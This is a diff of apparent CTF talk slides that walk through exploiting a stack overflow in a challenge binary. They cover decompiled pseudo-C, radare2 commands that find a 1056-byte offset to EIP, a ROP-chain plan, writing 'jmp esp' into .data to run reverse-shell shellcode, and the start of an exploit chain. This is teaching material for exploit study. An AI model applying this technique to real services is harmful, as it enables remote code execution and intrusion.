@@ -665,22 +665,22 @@ while(True):
 # What is the binary doing?
 
 ```C
-void __cdecl read_data(int fd, int size) {
+void read_data(int fd, int size) {
  if ( size + 1 <= 0x400 ) {
   char buf[0x41C];
   int nbread = recv(fd, &buf, size, 0);
   else {
-   nbread = nbread > 0x400? 1024; nbread;
+   nbread = nbread > 0x400 ? 1024; nbread;
    if (!check_nonnull(&buf, nbread)) {
-    fprintf(stderr, "%s\n", "This entry had Non-ASCII characters.. not writing entry..");
+    fprintf(stderr, "%s\n", "This entry had Non-ASCII characters.. […]");
    } else {
-    char s[0x80] = {0};
-    snprintf(&s, 0x7Fu, "diary%llu.txt", global_cpt);
-    FILE* stream = fopen(&s, "w");
+    char fb[0x80] = {0};
+    snprintf(&fb, 0x7F, "diary%llu.txt", global_cpt);
+    FILE* stream = fopen(&fb, "w");
     if ( stream ) {
      if ( nbread == fwrite(&buf, 1u, nbread, stream))
       fflush(stream)
-     fclose_and_remove(stream, &s);
+     fclose_and_remove(stream, &fb);
     }
    }
   }
@@ -691,6 +691,8 @@ void __cdecl read_data(int fd, int size) {
 ---
 
 # What is the binary doing?
+
+TL;DR
 
 1. Asking for a `size` in `fcn.08048e52`
 1. Checks that `size+1` isn't superior to `0x400` in `fcn.08048efe`
@@ -725,21 +727,17 @@ $ r2 -d ./fil_chal
 [0x004005f2]> dr=
 [0x004005f2]> pd 1 @ rip
 [0x004005f2]> pxW 4 @ rsp
-[0x004005f2]> woO `pxW 4 @ rsp~[1]`
+[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
 ```
 
 1056 bytes before overwriting EIP
 
 ---
 
-# Get RIP control (ex.)
-
----
-
 # Designing our ROP chain
 
-1. Leak libc address of read(1) and return to the vulnerable
-function
+1. Since the binary isn't PIE, we can gather some gadgets
+1. Leak libc address of read(1) and return to the vulnerable function
 2. Compute the offset of system(2)
 3. Read our command, and write it somewhere
 4. Call system(3) on it
@@ -749,11 +747,25 @@ But…
 
 ---
 
+# Designing our ROP chain
+
+1. Since the binary isn't PIE, we can gather some gadgets
+1. Leak libc address of read(1) and return to the vulnerable function
+2. Compute the offset of system(2)
+3. Read our command, and write it somewhere
+4. Call system(3) on it
+5. Send our command
+
+But y'all have different libc, and I'm lazy.
+
+
+---
+
 # Plot twist
 
 1. Stack is executable
-2. No jmp esp gadget
-3. Write jmp esp in the .data segment
+2. But no `jmp` esp gadget in the binary
+3. Write `jmp esp` somewhere in the `.data` segment
 4. Return to it
 5. Send our reverse-shell shellcode
 
@@ -768,6 +780,8 @@ But…
 # Exploit
 
 ```
+huge_number
+padding*0x420
 read
 pop;pop;pop;ret
 4 (socket fd)
